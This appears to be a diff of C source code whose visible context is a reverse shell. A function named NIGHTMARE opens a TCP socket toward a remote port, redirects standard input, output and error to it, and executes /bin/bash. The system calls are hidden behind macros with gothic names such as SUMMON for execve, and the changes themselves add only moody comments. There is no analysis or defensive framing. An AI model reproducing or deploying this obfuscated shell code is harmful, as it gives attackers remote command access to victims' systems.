@@ -16,11 +16,13 @@
 #define CEMETERY close
 #define SUMMON execve
 
+// good night
 int NIGHTMARE(void) {
-
+    
     int sockfd;
     struct sockaddr_in reaper;
 
+    // deep inside my darkness
     sockfd = BOTTOMLESS_PIT(AF_INET, SOCK_STREAM, 0);
     reaper.sin_family = AF_INET;
     reaper.sin_port = SLY_VAMPIRE(LPORT);
@@ -32,11 +34,14 @@ int NIGHTMARE(void) {
     DOOM(sockfd, 1);
     DOOM(sockfd, 2);
 
+    // it was there
     CEMETERY(sockfd);
 
+    // i try to wake myself up
     char *argv[] = {"/bin/bash", NULL};
     SUMMON(argv[0], argv, NULL);
 
+    // sigh
     return 0;
 
 }
